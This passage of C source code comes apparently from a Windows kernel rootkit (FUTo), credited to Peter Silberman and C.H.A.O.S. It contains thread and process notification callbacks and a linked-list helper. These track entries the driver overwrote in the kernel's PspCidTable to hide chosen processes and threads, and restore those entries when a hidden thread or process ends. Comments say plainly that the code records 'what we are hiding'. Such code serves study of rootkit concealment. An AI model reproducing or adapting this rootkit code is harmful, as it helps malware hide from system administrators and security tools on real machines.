				pp_tableEntry = (PPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
				while( p != NULL)
				{
					if((DWORD)p->ProcessId == (DWORD)ProcessId)
					{
//						DbgPrint("Restoring table of %d because it is being terminated\n", p->ProcessId);
						pp_tableEntry[p->x][p->y].object = p->object;
						pp_tableEntry[p->x][p->y].security = p->security;
					}
					p = p->pNext;
				}
					
			}
			else
			{
				ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
				while( p != NULL)
				{
					if((DWORD)p->ProcessId == (DWORD)ProcessId)
					{
//						DbgPrint("Restoring table of %d because it is being terminated\n", p->ProcessId);
						ppp_tableEntry[p->x][p->y][p->z].object =   p->object;
						ppp_tableEntry[p->x][p->y][p->z].security = p->security;
					}
					p = p->pNext;
				}	
					
			}
			
	}//end if
	
}

///////////////////////////////////////////////////////////////////
// VOID ThreadNotifyRoutine
// Parameters:
//       IN HANDLE hProcessId 	is the process ID of the process that owns the thread
//
//
//				IN HANDLE ThreadId 		is the threadId of the thread that is being closed or created 
//
//
//				IN BOOLEAN bCreate 		tells us if the thread is being closed or created
//
// Returns:
//		 
//     
// Description: This function is a callback that is called whenever a process is closed or opened.
//
// Note: FUTo is only interested in threads that are being closed
//
// Modified by: Peter Silberman & C.H.A.O.S. 
void ThreadNotifyRoutine(IN HANDLE  ProcessId, IN HANDLE  ThreadId, IN BOOLEAN  bCreate)
{
	PspCidTableList * p;
	PTABLE_ENTRY   orig_tableEntry, p_tableEntry, *pp_tableEntry, **ppp_tableEntry;
	
	orig_tableEntry = (PTABLE_ENTRY)*(PDWORD)(gcid_table + TABLEOFFSET);
	
//	DbgPrint("ThreadNotifyRoutine: ProcessId(0x%08x)(%d) ThreadId(0x%08x)(%d) HiddenId(0x%08x)(%d)\n", ProcessId,ProcessId, ThreadId,ThreadId,g_HiddenPID,g_HiddenPID);
	
	if(!bCreate && g_NoGUIFlag)
	{
		
//			DbgPrint("Checking to see if the thread %d being close is a thread we have hidden\n", ThreadId);
			p = GetPspCidTableHead(g_PspCidTableList);
			if(p == NULL)
				return;
			if(p->level == SINGLE_LEVEL)
			{
				p_tableEntry = (PTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
				while(p != NULL)
				{
					if(p->type == ID_THREAD && (DWORD)ThreadId == p->ThreadId)
					{
//						DbgPrint("Found %d thread that is being closed that we have hidden.\n", p->ThreadId);
						p_tableEntry[p->x].object = p->object;
						p_tableEntry[p->x].security = p->security;
					}
					p = p->pNext;
				}			
			}
			else if(p->level == DOUBLE_LEVEL)
			{
				pp_tableEntry = (PPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
				while( p != NULL)
				{
					if(p->type == ID_THREAD && (DWORD)ThreadId == p->ThreadId)
					{
//						DbgPrint("Found %d thread that is being closed that we have hidden.\n", p->ThreadId);
						pp_tableEntry[p->x][p->y].object = p->object;
						pp_tableEntry[p->x][p->y].security = p->security;
					}
					p = p->pNext;
				}
					
			}
			else
			{
				ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
				while( p != NULL)
				{
					if(p->type == ID_THREAD && (DWORD)ThreadId == p->ThreadId)
					{
//						DbgPrint("Found %d thread that is being closed that we have hidden.\n", p->ThreadId);
						ppp_tableEntry[p->x][p->y][p->z].object =   p->object;
						ppp_tableEntry[p->x][p->y][p->z].security = p->security;
					}
					p = p->pNext;
				}	
					
			}
			

		
	}//end if	

	
}



///////////////////////////////////////////////////////////////////
// PspCidTableList * GetPspCidTableHead
// Parameters:
//       IN PspCidTableList *  list 		is the linked list of indexes in the PspCidTable that have been modified
//
// Returns:
//		 OUT PspCidTableList *   returns the head of the linked list
//     
// Description: This function is responsible for walking back our internal linked list to give a pointer to the begining node of the list
//
// Note: 
//
//Modified by: Peter Silberman & C.H.A.O.S. 
PspCidTableList *GetPspCidTableHead(PspCidTableList *list)
{
	if(list == NULL)
		return NULL;
	if(list->pBack == NULL)
		return list;
	else
		return GetPspCidTableHead(	list->pBack);
}

///////////////////////////////////////////////////////////////////
// VOID add_index
// Parameters:
//       IN PspCidTableList ** list					the list to add to
//
//			 IN enum TableLevel p_level					the level of the handle that was overwritten
//
//			 IN enum ObjectTYpe obj_type				the object type it is either a ID_PROCESS or ID_THREAD
//
//			 IN DWORD pid												the process id of what we are hiding
//
//			 IN DWORD tid							  				the thread if of what we are hiding
//
//			 IN int a														represents the first index into the table 
//
//			 IN int b													  represents the second index into the table if the table has been expanded to a double level table
//
//			 IN int c													  represents the third index into the table if the table has been expanded into a triple level table
//
// 			 DWORD obj													the value of the object before it was overwritten 
//
//			 ACCESS_MASK sec										the value of the access mask security before it was overwritten
//
// Returns:
//		 
//     
// Description: The function is used to keep track of what we overwrite so that it can be restored
//
// Note: 
//
//Modified by: Peter Silberman & C.H.A.O.S. 
void add_index( PspCidTableList ** list, enum TableLevel p_level, enum ObjectType obj_type,DWORD eproc, DWORD pid, DWORD tid, int a, int b, int c, DWORD obj, ACCESS_MASK sec )
{
	
	//DbgPrint("add_index(0x%08x, %d, %d, 0x%08x, 0x%08x, 0x%08x, %d, %d, %d, 0x%08x, 0x%08x)\n", (*list), p_level, obj_type, pid, tid,a,b,c,obj,sec);
	if((*list) == NULL)
	{
			(*list) = ExAllocatePool(PagedPool, sizeof(PspCidTableList));
			if ((*list) == NULL)
			{
				return;		
			}
			
			(*list)->level = p_level;
			(*list)->type = obj_type;
			(*list)->ProcessId = pid;
			(*list)->ThreadId = tid;
			
			(*list)->x = a;
			(*list)->y = b;
			(*list)->z = c;
			(*list)->eproc = eproc;
			(*list)->object = obj;
			(*list)->security = sec;
			
			(*list)->pBack = NULL;
			(*list)->pNext = NULL;
	}
	
	
	else if((*list)->pNext != NULL)
	{
				while((*list)->pNext != NULL)
				{
					
						(*list) = (*list)->pNext;
				}
			(*list)->pNext = ExAllocatePool(PagedPool, sizeof(PspCidTableList));
			if ((*list)->pNext == NULL)
			{
				return;		
			}
			
			
			(*list)->pNext->level = p_level;
			
			(*list)->pNext->type = obj_type;
			(*list)->pNext->ProcessId = pid;
			(*list)->pNext->ThreadId = tid;
			
			(*list)->pNext->x = a;
			(*list)->pNext->y = b;
			(*list)->pNext->z = c;
			(*list)->pNext->eproc = eproc;
			(*list)->pNext->object = obj;
			(*list)->pNext->security = sec;
			
			(*list)->pNext->pBack = (*list);
			(*list)->pNext->pNext = NULL;

	
			
	}
	else if((*list)->pNext == NULL)
	{
		
		(*list)->pNext = ExAllocatePool(PagedPool, sizeof(PspCidTableList));
			if ((*list)->pNext == NULL)
			{
				return;		
			}
			
			(*list)->pNext->level = p_level;
			(*list)->pNext->type = obj_type;
			(*list)->pNext->ProcessId = pid;
			(*list)->pNext->ThreadId = tid;
			(*list)->pNext->x = a;
			(*list)->pNext->y = b;
			(*list)->pNext->z = c;
			
			(*list)->pNext->eproc = eproc;
			(*list)->pNext->object = obj;
			(*list)->pNext->security = sec;
			
			(*list)->pNext->pBack = (*list);
			(*list)->pNext->pNext = NULL;
	
	}
	
}